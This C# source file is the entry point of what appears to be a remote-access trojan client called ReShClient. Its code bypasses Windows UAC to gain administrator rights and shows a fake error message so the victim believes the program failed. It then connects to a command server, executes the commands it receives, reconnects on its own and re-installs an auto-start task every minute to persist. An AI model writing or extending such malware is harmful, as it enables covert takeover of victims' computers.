using System.IO.Pipes;
using System.Reflection;
using System.Security.Principal;
using System.Threading.Tasks;

namespace ReShClient
{
    internal static class Program
    {

        private static RSClient _client = new RSClient("127.0.0.1", 65432);
        public static bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        [STAThread]
        public static async Task Main()
        {
            if (!IsAdministrator())
            {
                try
                {
                    BypassUAC.Start(Assembly.GetExecutingAssembly().Location);
                    return;
                }
                catch (Exception ex)
                {
                    MyLogger.LogError($"[*]Error launching elevated COM object: {ex.Message}");
                }
            }
            if (Environment.CommandLine != null && Environment.CommandLine.Contains("--uninstall"))
            {
                try
                {
                    SystemUtility.SetAutoStartTask(false);
                }
                catch (Exception ex)
                {
                    MyLogger.LogError($"[*]Error removing auto-start task: {ex.Message}");
                }
                return;
            }
            bool silentMode = false;
            if (Environment.CommandLine != null && Environment.CommandLine.Contains("--silent"))
            {
                silentMode = true;
            }


            _client.OnCommandReceived += CommandHandler.OnCommandReceived;
            _client.OnDisconnected += () =>
            {
                _ = Task.Run(async () =>
                {
                    while (!await _client.ConnectAsync())
                    {
                        await Task.Delay(5000);
                    }
                });
            };
            CommandHandler.Client = _client;

            Application.ThreadException += (sender, e) =>
            {
                MyLogger.LogError($"[*]Unhandled UI thread exception: {e.Exception.Message}");
            };
            AppDomain.CurrentDomain.UnhandledException += (sender, e) =>
            {
                if (e.ExceptionObject is Exception ex)
                {
                    MyLogger.LogError($"[*]Unhandled non-UI thread exception: {ex.Message}");
                }
                else
                {
                    MyLogger.LogError("[*]Unhandled non-UI thread exception: Unknown exception object");
                }
            };
            ApplicationConfiguration.Initialize();

            try
            {
                if (!silentMode)
                    _ = Task.Run(() => MessageBox.Show("This program cannot run on yout system.Please contact publishers for details.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error));

                await _client.ConnectAsync();
                await Task.Delay(5000);
                while (true)
                {
                    try
                    {
                        SystemUtility.SetAutoStartTask(true);
                    }
                    catch(Exception ex)
                    {
                        MyLogger.LogError($"[*]Error setting auto-start task: {ex.Message}");
                    }
                    await Task.Delay(60000);
                }
            }
            catch (Exception ex)
            {
                MyLogger.LogError($"[*]Fatal error in main application loop: {ex.Message}");
            }
        }
    }
}